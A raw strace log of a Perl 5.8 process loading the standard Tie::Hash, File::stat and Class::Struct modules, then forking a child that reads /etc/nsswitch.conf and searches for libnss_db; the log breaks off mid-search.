6989  07:16:29.100019 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
6989  07:16:29.100342 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
6989  07:16:29.100868 read(8, "", 4096) = 0
6989  07:16:29.100885 close(8)          = 0
6989  07:16:29.100916 stat64("/etc/perl/File/stat.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.100932 stat64("/etc/perl/File/stat.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.100946 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.100959 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.100974 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.100987 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.101001 stat64("/usr/lib/perl5/File/stat.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.101013 stat64("/usr/lib/perl5/File/stat.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.101026 stat64("/usr/share/perl5/File/stat.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.101038 stat64("/usr/share/perl5/File/stat.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.101056 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.101069 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.101083 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.101107 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
6989  07:16:29.101129 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.101144 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.101156 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.101173 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
6989  07:16:29.101577 stat64("/etc/perl/Class/Struct.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.101605 stat64("/etc/perl/Class/Struct.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.101619 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.101633 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.101647 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.101661 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.101675 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.101687 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.101701 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.101713 stat64("/usr/share/perl5/Class/Struct.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.101727 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.101740 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.101754 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.101767 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
6989  07:16:29.101789 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
6989  07:16:29.101804 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae2c8) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.101816 _llseek(10, 0, [0], SEEK_CUR) = 0
6989  07:16:29.101835 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
6989  07:16:29.102271 brk(0x82de000)    = 0x82de000
6989  07:16:29.102628 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
6989  07:16:29.103229 _llseek(10, 6916, [6916], SEEK_SET) = 0
6989  07:16:29.103247 _llseek(10, 0, [6916], SEEK_CUR) = 0
6989  07:16:29.103258 close(10)         = 0
6989  07:16:29.103435 _llseek(8, 1334, [1334], SEEK_SET) = 0
6989  07:16:29.137089 _llseek(8, 0, [1334], SEEK_CUR) = 0
6989  07:16:29.137089 close(8)          = 0
6989  07:16:29.137351 brk(0x82ff000)    = 0x82ff000
6989  07:16:29.137495 _llseek(6, 2689, [2689], SEEK_SET) = 0
6989  07:16:29.137518 _llseek(6, 0, [2689], SEEK_CUR) = 0
6989  07:16:29.137529 close(6)          = 0
6989  07:16:29.137726 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d94908) = 6990
6990  07:16:29.147586 getppid()         = 6989
6990  07:16:29.148117 open("/etc/nsswitch.conf", O_RDONLY) = 6
6990  07:16:29.148143 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
6990  07:16:29.148163 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5a000
6990  07:16:29.148178 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
6990  07:16:29.148234 read(6, "", 4096) = 0
6990  07:16:29.148244 close(6)          = 0
6990  07:16:29.148254 munmap(0xb7f5a000, 4096) = 0
6990  07:16:29.148281 open("/etc/ld.so.cache", O_RDONLY) = 6
6990  07:16:29.148294 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6990  07:16:29.148311 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d61000
6990  07:16:29.148323 close(6)          = 0
6990  07:16:29.148334 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6990  07:16:29.148352 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148366 stat64("/lib/tls/i686/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148380 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148393 stat64("/lib/tls/i686/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148405 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148418 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6990  07:16:29.148436 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148448 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6990  07:16:29.148465 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148478 stat64("/lib/tls/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148490 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148502 stat64("/lib/tls/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148513 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148556 stat64("/lib/tls/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148582 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148594 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6990  07:16:29.148611 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148623 stat64("/lib/i686/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148634 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148646 stat64("/lib/i686/sse2", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148657 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148669 stat64("/lib/i686/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148680 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148691 stat64("/lib/i686", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148702 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6990  07:16:29.148714 stat64("/lib/sse2/cmov", 0xbf9aee4c) = -1 ENOENT (No such file or directory)
6990  07:16:29.148725 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
